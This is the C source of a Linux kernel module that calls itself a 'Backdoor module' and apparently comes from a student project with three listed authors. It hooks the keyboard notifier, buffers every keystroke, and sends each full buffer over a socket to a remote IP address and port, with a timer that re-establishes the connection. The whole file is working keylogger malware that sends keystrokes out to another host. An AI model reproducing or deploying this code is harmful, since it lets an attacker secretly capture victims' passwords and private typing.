#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/keyboard.h>
#include <linux/irq.h>
#include <linux/interrupt.h>
#include <linux/delay.h>
#include <linux/timer.h>
#include <linux/mutex.h>

#include "backdoor.h"
#include "networking.h"

static struct notifier_block keyboard_notifier_block = {
    .notifier_call = keyboard_notifier_callback,
};

// Keyboard stroke buffer
static char keystrokes[KEY_BUFFER_SIZE + 1] = ""; 

// Timer to reinitialize connection
static struct timer_list connection_timer;

// Mutex between sock refreshment and other resources.
static struct mutex socks_mutex;

// Keyboard interrupt handler
irqreturn_t keyboard_interrupt_handler(int irq, void *dev_id) {
    static int32_t buffer_count = 0; // Counts how many chars have been logged.
    struct keyboard_notifier_param *param = dev_id;

    if (param && param->value) {
        uint32_t keycode = param->value;
        char key = (char) keycode; // Convert keycode to char

        keystrokes[buffer_count] = key;
        buffer_count = (buffer_count + 1)%KEY_BUFFER_SIZE;

        printk(KERN_INFO "Buffer: %s\n", keystrokes);
        printk(KERN_INFO "Buffer size: %d\n", buffer_count);

        if (buffer_count == 0) {
            send_message(keystrokes);
            mod_timer(&connection_timer, jiffies + msecs_to_jiffies(1000));
        }
    }

    return IRQ_NONE;
}

// Keyboard notifier callback
int keyboard_notifier_callback(struct notifier_block *nblock, unsigned long code, void *_param) {
    struct keyboard_notifier_param *param = _param;

    if (code == KBD_KEYSYM && param && param->down) {
        // Call the keyboard interrupt handler
        keyboard_interrupt_handler(0, param);
    }

    return NOTIFY_OK;
}


void initialize_conn(struct timer_list *t) {
    int result;
    
    result = mutex_trylock(&socks_mutex);
    if (result != 1) {
    	mod_timer(&connection_timer, jiffies + msecs_to_jiffies(1000));
        mutex_unlock(&socks_mutex);
	    return;
    }

    result = create_socket(IP_ADDRESS, PORT);
    mutex_unlock(&socks_mutex);

    if (result < 0) {
        printk(KERN_ERR "Failed to connect\n");
    }
}


static int __init keyboard_module_init(void) {
    int result;

    mutex_init(&socks_mutex);

    result = create_socket(IP_ADDRESS, PORT);
    if (result < 0) {
        printk(KERN_ERR "Failed to connect\n");
        return result;
    }

    timer_setup(&connection_timer, initialize_conn, 0);

    // Register the keyboard notifier
    result = register_keyboard_notifier(&keyboard_notifier_block);
    if (result != 0) {
        printk(KERN_ERR "Failed to register keyboard notifier\n");
        return result;
    }

    printk(KERN_INFO "Backdoor module initialized\n");
    return 0;
}

static void __exit keyboard_module_exit(void) {
    int ret;
    // Unregister the keyboard notifier
    unregister_keyboard_notifier(&keyboard_notifier_block);

    ret = shutdown_socket();
    if (ret < 0) {
	    printk(KERN_ERR "Unable to release socket");
	    return;
    }

    del_timer(&connection_timer);
    mutex_destroy(&socks_mutex);

    printk(KERN_INFO "Backdoor module exited\n");
}

module_init(keyboard_module_init);
module_exit(keyboard_module_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Gabriel Franceschi Libardi");
MODULE_AUTHOR("Gustavo Moura Scarenci");
MODULE_AUTHOR("Artur Brenner Weber");
